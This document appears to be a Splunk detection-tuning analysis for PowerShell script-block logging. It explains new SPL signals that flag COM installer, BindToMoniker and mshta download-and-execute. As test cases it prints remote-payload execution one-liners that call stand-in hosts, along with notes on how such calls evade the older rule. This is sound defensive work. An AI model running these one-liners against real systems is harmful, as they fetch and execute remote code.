# Analysis | T1059.001 WinEvent EID 4104 | Splunk Detection Tuning

## Scope

This analysis covers the gaps identified in the in-memory and execution mechanism checks of the EID 4104 SPL detection, and the reasoning behind adding `hasAltExec` and `hasRemote` as new evaluation signals.

### EID 4104 Boundary

EID 4104 logs what the PowerShell engine compiles and runs — not what cmd.exe or other interpreters do independently. A command like:

```powershell
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('https://evil.example/payload.sct').Exec();close()"
```

...is only visible in 4104 if it was invoked from inside a PS script block. Catching the specific `cmd.exe → mshta.exe` parent image chain is a Sysmon EID 1 problem, not a 4104 problem I am choosing not to tune towards accounting for parent images.

The approach here is to catch the PS-native equivalents: `BindToMoniker` (the PS equivalent of VBScript `GetObject`) and `mshta` when called directly inside a PS script block. These appear in 4104 regardless of the parent process chain, and they survive `-EncodedCommand` because the engine must decode the block before running it.

---

## Identified Gaps

### Gap 1 — COM-Based Execution Without IEX

V1 catches download + IEX together (High) and either alone (Medium). A COM-based download-and-execute that doesn't use a recognised fetch keyword or `IEX` scores nothing:

```powershell
$installer = New-Object -ComObject WindowsInstaller.Installer
$installer.InstallProduct("https://malicious.example/payload.msi", "ACTION=INSTALL")
```

ART Test 6 confirmed this: `MsXml2.ServerXmlHttp` scored zero, only the `IEX` call on the response triggered Medium. An attacker omitting `IEX` and executing via `.ResponseText` assignment or a compiled method call would produce no alert.

### Gap 2 — Moniker Binding / Scriptlet Execution

`BindToMoniker` can load and execute a remote scriptlet entirely inside a PS script block with no child process spawn:

```powershell
[System.Runtime.InteropServices.Marshal]::BindToMoniker("script:https://evil.example/payload.sct")
```

This runs fully in memory, spawns nothing visible to EID 1, and was not in the V1 keyword list. It is the PS-native equivalent of what VBScript `GetObject` does, but lives in 4104 telemetry rather than wscript/cscript.

---

## Decision: hasAltExec + hasRemote

Two new signals were added to close both gaps:

**`hasAltExec`** — COM installer and moniker binding primitives:
```spl
| eval hasAltExec = if(match(ScriptBlockText, "(?i)(WindowsInstaller\.Installer|\.InstallProduct\s*\(|BindToMoniker|\bmshta\b)"), 1, 0)
```

**`hasRemote`** — URL presence as a pairing condition:
```spl
| eval hasRemote = if(match(ScriptBlockText, "(?i)(https?://|ftp://)"), 1, 0)
```

Severity mapping:
- `anyAltExec=1` alone → Medium
- `anyAltExec=1 AND anyRemote=1` → High (remote COM/LOLBin download-and-execute)

`hasRemote` is not a standalone detection — scripts referencing URLs are common and benign. The signal only matters when paired with `hasAltExec`.

---

## Key Finding

The primary gap was COM-based download-and-execute: the V1 detection only scores `IEX`, so the alert fires at Medium (or not at all) when it should fire High. The secondary gap was scriptlet moniker binding — a fully in-memory execution path with no process spawn.

Both are addressed by the `hasAltExec` signal. The `hasRemote` pairing condition is what distinguishes a legitimate `BindToMoniker` usage from a remote code execution attempt.

---

## Risk of the Filter

Accepted risk: `hasAltExec` increases FPs slightly because `mshta` and `BindToMoniker` appear in some legitimate administrative PS scripts.

Mitigations applied:
1. `anyAltExec` alone stays at Medium — it does not reach High without `anyRemote`.
2. `BindToMoniker` without a URL in the same execution bucket never escalates.

Residual scenario: an admin script that invokes `mshta` and references an internal URL in the same 10-minute bucket could reach High. Acceptable in a lab; reassess against environment baseline before promoting to production.
